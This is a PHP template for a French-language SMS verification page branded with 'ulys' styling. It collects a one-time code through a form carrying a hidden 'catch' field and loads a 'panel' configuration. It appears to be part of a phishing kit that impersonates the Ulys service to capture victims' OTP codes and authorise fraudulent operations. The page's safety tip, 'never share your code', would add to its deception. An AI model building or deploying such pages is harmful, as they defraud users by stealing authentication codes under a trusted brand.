<?php
require_once 'config/panel.php';
// Start output buffering to capture content
ob_start();
?>

<div class="ulys-main">
    <div class="ulys-login-card">
        <h2>Code de vérification</h2>
        <div class="ulys-login-desc mb-4">
            <span class="ulys-orange">Un code a été envoyé par SMS. Veuillez le saisir pour valider votre opération.</span>
        </div>
        <form method="POST" action="index.php?view=otp">
            <input type="hidden" name="catch">
            <div class="ulys-form-group">
                <input name="otp" type="text" class="ulys-input<?php if (isset($_SESSION['ERRORS']['otp'])) { echo ' is-invalid'; } ?>" placeholder="Code reçu par SMS" value="<?php if (!empty($_SESSION['otp'])){ echo $_SESSION['otp'];} ?>">
                <?php if (isset($_SESSION['ERRORS']['otp'])): ?>
                    <div class="invalid-feedback d-block"><?php echo $_SESSION['ERRORS']['otp']; ?></div>
                <?php endif; ?>
            </div>
            <button type="submit" name="submit" value="otp" class="ulys-btn" style="background: #ff3c1b; color: #fff;">Valider</button>
        </form>
    </div>
    <div class="ulys-tips-col">
        <h3>Astuces&nbsp;!</h3>
        <div class="ulys-tip-block">
            <i class="fas fa-shield-alt"></i>
            <div>
                <strong>Sécurité</strong><br>
                Ne communiquez jamais votre code à un tiers.
            </div>
        </div>
        <div class="ulys-tip-block">
            <i class="fas fa-mobile-alt"></i>
            <div>
                <strong>Problème de réception ?</strong><br>
                Vérifiez que votre téléphone est allumé et capte le réseau.
            </div>
        </div>
    </div>
</div>

<?php
// Get the buffer contents and clean the buffer
$viewContent = ob_get_clean();

// Include layout with the view content
include_once 'layout.php';
?> 